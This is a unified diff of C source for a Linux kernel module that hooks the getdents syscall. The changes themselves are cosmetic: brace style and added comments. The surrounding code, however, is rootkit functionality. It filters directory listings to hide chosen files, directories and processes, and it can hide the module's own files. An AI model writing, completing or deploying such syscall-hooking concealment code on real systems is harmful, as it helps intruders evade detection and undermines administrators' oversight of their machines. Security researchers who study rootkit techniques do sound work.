@@ -7,15 +7,15 @@
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(4,17,0)
 asmlinkage long (*orig_getdents)(unsigned int fd, char __user *dirp, unsigned int count);
-asmlinkage long hook_getdents(unsigned int fd, char __user *dirp, unsigned int count)
-{
+
+asmlinkage long hook_getdents(unsigned int fd, char __user *dirp, unsigned int count) {
     long ret = orig_getdents(fd, dirp, count);
     return hook_getdents_impl(fd, dirp, ret);
 }
 #else
 asmlinkage long (*orig_getdents)(const struct pt_regs *regs);
-asmlinkage int hook_getdents(const struct pt_regs *regs)
-{
+
+asmlinkage int hook_getdents(const struct pt_regs *regs) {
     unsigned int fd = regs->di;
     char __user *dirp = (char __user *)regs->si;
     long ret = orig_getdents(regs);
@@ -24,9 +24,8 @@ asmlinkage int hook_getdents(const struct pt_regs *regs)
 #endif
 
 
-long hook_getdents_impl(unsigned int fd, char __user *dirp, long ret)
-{
-    long new_ret = ret; // Total bytes after filtering
+long hook_getdents_impl(unsigned int fd, char __user *dirp, long ret) {
+    long new_ret = ret; // total bytes after filtering
     unsigned long offset = 0;
     unsigned long bytes_left;
     struct linux_dirent64 *d, *kdirent, *kdirent_orig;
@@ -38,7 +37,7 @@ long hook_getdents_impl(unsigned int fd, char __user *dirp, long ret)
     if (!kdirent)
         return new_ret;
 
-    kdirent_orig = kmalloc(new_ret, GFP_KERNEL);
+    kdirent_orig = kmalloc(new_ret, GFP_KERNEL); // save orig results as backup (in case something fails)
     if (!kdirent_orig) {
         kfree(kdirent);
         return new_ret;
@@ -57,13 +56,13 @@ long hook_getdents_impl(unsigned int fd, char __user *dirp, long ret)
         size_t shift_by = 0;
 
 #ifdef HIDE_MODULE
-        if (is_mod_directory(fd) && strstr(d->d_name, MODULE_NAME)) {
+        if (is_mod_directory(fd) && strstr(d->d_name, MODULE_NAME)) { // if modules directory and HIDE_MODULE is set - hide the mod files
             shift_by = d->d_reclen;
             goto shift_and_iter;
         }
 #endif
 
-        if (str_entry_is_excluded(d->d_name)) { // hide files by custom filtering
+        if (str_entry_is_excluded(d->d_name)) { // hide dirs/files by custom filtering
             shift_by = d->d_reclen;
             goto shift_and_iter;
         } else if (is_numeric(d->d_name)) { // hide processes that contain the excluded string in the cmdline
